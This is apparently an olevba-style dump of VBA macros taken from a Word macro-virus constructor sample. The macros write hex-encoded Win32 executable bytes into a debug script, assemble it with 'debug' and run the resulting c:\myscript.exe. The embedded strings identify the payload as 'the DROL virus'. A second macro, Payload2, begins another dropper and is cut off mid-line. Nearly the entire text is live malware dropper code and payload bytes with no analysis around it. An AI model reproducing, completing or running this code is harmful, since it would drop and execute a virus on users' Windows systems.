WordBasic.Insert "print #1, " + Chr(34) + _
"e 1750 e9 11 40 00 8d bd a2 21 40 00 b0 00 b9 80 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1760 00 f2 ae c6 47 ff 5c 8d b5 a6 22 40 00 b9 09 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1770 00 00 f3 a4 8d b5 a2 21 40 00 6a 00 6a 00 6a 02 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1780 6a 00 6a 01 68 00 00 00 c0 56 ff 95 c1 11 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1790 89 85 49 17 40 00 83 f8 ff 74 7b 6a 00 8d 85 f5 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 17a0 23 40 00 50 68 46 01 00 00 8d 85 af 22 40 00 50 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 17b0 ff b5 49 17 40 00 ff 95 f9 11 40 00 ff b5 49 17 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 17c0 40 00 ff 95 c5 11 40 00 8d 85 f9 23 40 00 50 8d " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 17d0 85 fd 23 40 00 50 6a 00 68 3f 00 0f 00 6a 00 6a " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 17e0 00 6a 00 8d 85 01 24 40 00 50 68 01 00 00 80 ff " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 17f0 95 29 12 40 00 6a 19 8d 85 a2 21 40 00 50 6a 01 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1800 6a 00 8d 85 17 24 40 00 50 8b 85 fd 23 40 00 50 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1810 ff 95 2d 12 40 00 61 c3 44 52 4f 4c 20 76 31 2e " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1820 30 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1830 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1840 20 20 20 00 0d 0a 0d 0a 54 68 69 73 20 69 73 20 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1850 74 68 65 20 44 52 4f 4c 20 76 69 72 75 73 0d 0a " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1860 0d 0a 63 6f 70 79 72 69 67 68 74 20 28 43 29 20 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1870 4c 6f 72 64 20 4a 75 6c 75 73 20 2f 20 5b 53 4c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1880 41 4d 5d 0d 0a 0d 0a 77 72 69 74 74 65 6e 20 66 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1890 6f 72 20 66 75 6e 2e 2e 2e 20 3b 2d 29 0d 0a 0d " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 18a0 0a 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 18b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 18c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 18d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 18e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 18f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1900 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1910 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1920 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1930 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1940 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1950 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1960 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1970 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1980 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1990 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 19a0 00 00 00 00 00 00 64 72 6f 6c 2e 63 75 72 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 19b0 00 02 00 01 00 20 20 02 00 00 00 00 00 30 01 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 19c0 00 16 00 00 00 28 00 00 00 20 00 00 00 40 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 19d0 00 01 00 01 00 00 00 00 00 00 02 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 19e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 19f0 00 ff ff ff 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a00 00 00 00 00 00 00 05 28 00 00 05 28 00 00 05 28 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a10 00 00 07 f8 00 00 03 f0 00 00 03 f0 00 00 07 f8 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a20 00 00 07 38 00 00 0e 1c 00 00 0f 3c 00 00 1f 3e " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a30 00 00 1f fe 00 00 1d ee 00 00 18 c6 00 00 1d ee " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a40 00 00 1f fe 00 00 0f fe 00 00 0f fc 00 00 0f fc " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a50 00 00 07 f8 00 00 07 f8 00 00 01 e0 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a70 00 00 00 00 00 ff ff ff fc ff ff ff f8 ff fd 2f " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a80 f1 ff f8 07 e3 ff f0 03 c7 ff f0 03 8f ff f0 03 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a90 1f ff f0 02 3f ff f8 04 7f ff f8 00 ff ff f0 01 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1aa0 ff ff f0 03 ff ff e0 01 ff ff e0 01 ff ff c0 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ab0 ff ff c0 00 ff ff c0 00 ff ff c0 00 ff ff c0 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ac0 ff ff c0 00 ff ff c0 00 ff ff 80 01 ff ff 00 01 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ad0 ff ee 30 03 ff ec 70 03 ff c8 f8 07 ff c1 fe 1f " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ae0 ff c3 ff ff ff 80 7f ff ff 81 ff ff ff 8f ff ff " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1af0 ff 7f ff ff ff 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b00 00 43 6f 6e 74 72 6f 6c 20 50 61 6e 65 6c 5c 43 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b10 75 72 73 6f 72 73 00 41 72 72 6f 77 00 60 8d bd " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b20 3d 12 40 00 8d b5 0e 18 40 00 8b 06 03 c5 80 38 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b30 ff 74 24 57 50 ff 95 9d 11 40 00 83 f8 ff 74 11 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b40 50 8d 5f 2c 53 ff 95 f1 11 40 00 ff 95 c5 11 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b50 00 66 83 c6 04 eb d3 61 c3 60 b8 05 00 00 00 e8 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b60 61 00 00 00 83 c0 03 bb 07 00 00 00 2b d8 8d bd " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b70 9f 17 40 00 b0 2e aa b9 07 00 00 00 3b cb 76 10 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b80 b8 19 00 00 00 e8 3b 00 00 00 83 c0 61 aa e2 ec " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b90 b0 00 aa e2 e7 61 c3 50 8b 44 24 f8 01 85 c1 24 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ba0 40 00 58 c3 51 33 c9 8b 85 c1 24 40 00 66 b9 21 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1bb0 00 03 c0 73 02 34 c5 e2 f8 89 85 c1 24 40 00 59 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1bc0 c3 01 00 00 00 52 51 ba 00 00 00 00 50 e8 d2 ff " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1bd0 ff ff 59 f7 f1 92 59 5a c3 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1be0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1bf0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ca0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1cb0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1cc0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1cd0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ce0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1cf0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1da0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1db0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1dc0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1dd0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1de0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1df0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ea0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1eb0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ec0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ed0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ee0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ef0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f00 00 10 00 00 54 01 00 00 0e 38 12 38 16 38 1a 38 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f10 1e 38 22 38 26 38 2a 38 38 38 83 38 99 38 ae 38 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f20 b4 38 be 38 c6 38 cc 38 d3 38 d9 38 e0 38 e6 38 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f30 ed 38 f3 38 f9 38 00 39 06 39 0c 39 14 39 1e 39 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f40 35 39 41 39 48 39 50 39 5d 39 6d 39 77 39 7d 39 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f50 83 39 88 39 93 39 9a 39 e1 39 e7 39 0e 3a 16 3a " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f60 21 3a 2a 3a 37 3a 3e 3a 49 3a 50 3a 56 3a 62 3a " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f70 68 3a 71 3a 85 3a 8c 3a 92 3a a1 3a a8 3a ae 3a " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f80 bd 3a c4 3a cb 3a d4 3a db 3a f4 3a fb 3a 08 3b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f90 1f 3b 25 3b 30 3b 3d 3b 44 3b 58 3b 5e 3b 65 3b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1fa0 70 3b 7c 3b 3e 38 49 38 ef 39 fa 39 92 3b 98 3b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1fb0 a6 3b b8 3b c0 3b c6 3b cc 3b d4 3b e0 3b e6 3b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1fc0 ec 3b fb 3b 08 3c 19 3c 52 3c 6c 3c 75 3c 7e 3c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1fd0 87 3c 93 3c 9c 3c b6 3c c9 3c cf 3c de 3c ea 3c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1fe0 01 3d 0b 3d 22 3d 39 3d 43 3d 56 3d 6d 3d 8c 3d " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ff0 95 3d b1 3d c1 3d db 3d e5 3d eb 3d f7 3d 46 3e " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2000 4f 3e 5a 3e 6c 3e 75 3e 87 3e 9f 3e b4 3e c7 3e " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2010 d5 3e e2 3e ed 3e f5 3e fb 3e 01 3f 07 3f 11 3f " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2020 17 3f 1d 3f 23 3f 29 3f 2e 3f 3f 3f 45 3f 4b 3f " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2030 51 3f 57 3f 5d 3f 63 3f 6f 3f 7d 3f 84 3f 93 3f " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2040 99 3f a0 3f a7 3f b8 3f c1 3f f2 3f f9 3f e0 3f " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2050 e7 3f 00 00 00 20 00 00 54 00 00 00 0a 30 12 30 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2060 21 30 27 30 2f 30 3e 30 50 30 8c 30 92 30 b2 30 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2070 b8 30 be 30 c4 30 f1 30 12 31 49 30 56 30 69 30 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2080 76 30 9f 30 ab 30 ca 30 d1 30 e5 30 f9 30 04 31 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2090 0b 31 20 34 26 34 37 34 47 34 4d 34 70 34 9e 34 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 20a0 a9 34 bb 34 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 20b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 20c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 20d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 20e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 20f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"RCX" + _
Chr(34) + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"2000" + _
Chr(34) + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"W" + _
Chr(34) + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"Q" + _
Chr(34) + T$
WordBasic.Insert "Close #1" + T$
WordBasic.Insert "Shell " + Chr(34) + "debug < c:\myscript.scr > nul" + _
Chr(34) + T$
WordBasic.Insert "Shell " + Chr(34) + "c:\myscript.exe > nul" + _
Chr(34) + T$
End Sub

-------------------------------------------------------------------------------
VBA MACRO Payload2.bas 
in file: Constructor.MSWord.Ctvck.c - OLE stream: 'Macros/VBA/Payload2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim T$
T$ = Chr(13) + Chr(10)
WordBasic.Insert "Open " + Chr(34) + "C:\myscript.scr" + Chr(34) + _
" For Output As #1" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"n c:\myscript.exe" + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0100 4d 5a 50 00 02 00 00 00 04 00 0f 00 ff ff 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0110 b8 00 00 00 00 00 00 00 40 00 1a 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0120 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0130 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0140 ba 10 00 0e 1f b4 09 cd 21 b8 01 4c cd 21 90 90 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0150 54 68 69 73 20 70 72 6f 67 72 61 6d 20 6d 75 73 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0160 74 20 62 65 20 72 75 6e 20 75 6e 64 65 72 20 57 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0170 69 6e 33 32 0d 0a 24 37 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0180 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0190 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 01a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 01b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 01c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 01d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 01e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 01f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0200 50 45 00 00 4c 01 04 00 8d 25 b3 49 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0210 00 00 00 00 e0 00 8e 81 0b 01 02 19 00 12 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
